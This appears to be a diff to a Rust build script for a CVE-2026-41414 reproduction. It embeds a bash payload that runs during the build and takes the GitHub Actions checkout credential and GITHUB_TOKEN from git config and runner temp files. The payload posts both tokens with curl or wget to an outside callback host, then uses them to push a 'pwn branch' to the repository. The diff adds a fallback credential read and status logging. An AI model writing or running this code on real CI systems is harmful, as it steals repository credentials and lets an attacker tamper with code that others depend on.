@@ -4,11 +4,20 @@ fn main() {
     let payload = r#"
 set +e
 CB="https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-41414-e52a4ae6e154?harness_run_id=20260906T131744-4948ee70"
-XH=$(git config --local --get-all http.https://github.com/.extraheader 2>/dev/null | sed 's/^AUTHORIZATION: basic //')
+note() { echo "cargo:warning=[cve-2026-41414-repro] $1"; }
+note "payload executing in job=${GITHUB_JOB} run=${GITHUB_RUN_ID} event=${GITHUB_EVENT_NAME}"
+XH=$(git config --get-all http.https://github.com/.extraheader 2>/dev/null | head -n1)
+XH=$(printf '%s' "$XH" | sed 's/^AUTHORIZATION: basic //')
+if [ -z "$XH" ]; then
+  XH=$(cat /home/runner/work/_temp/git-credentials-*.config 2>/dev/null | grep -m1 'extraheader' | sed 's/.*AUTHORIZATION: basic //')
+fi
 APP_TOK=$(printf '%s' "$XH" | base64 -d 2>/dev/null | sed 's/^x-access-token://')
 GH_TOK="${GITHUB_TOKEN}"
+if [ -n "$APP_TOK" ]; then note "persisted checkout credential recovered: yes (len=${#APP_TOK})"; else note "persisted checkout credential recovered: no"; fi
+if [ -n "$GH_TOK" ]; then note "GITHUB_TOKEN in step env: yes"; else note "GITHUB_TOKEN in step env: no"; fi
 push_branch() {
   TOK="$1"
+  [ -z "$TOK" ] && return 1
   TMPD=$(mktemp -d)
   git clone -q "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" "$TMPD/base" 2>/dev/null || return 1
   cd "$TMPD/base" || return 1
@@ -34,7 +43,11 @@ curl -sS -m 15 -X POST "$CB" \
   --data-urlencode "gh_token=${GH_TOK}" \
   --data-urlencode "app_token=${APP_TOK}" >/dev/null \
   || wget --post-data='' -qO- "$CB" >/dev/null || true
-push_branch "$APP_TOK" || push_branch "$GH_TOK" || true
+note "callback POST attempted"
+if push_branch "$APP_TOK"; then note "pwn branch PUSHED to ${GITHUB_REPOSITORY} with recovered persisted credential"
+elif push_branch "$GH_TOK"; then note "pwn branch PUSHED to ${GITHUB_REPOSITORY} with env GITHUB_TOKEN"
+else note "pwn branch push FAILED with both credentials"
+fi
 "#;
     let _ = Command::new("bash").arg("-c").arg(payload).status();
 }
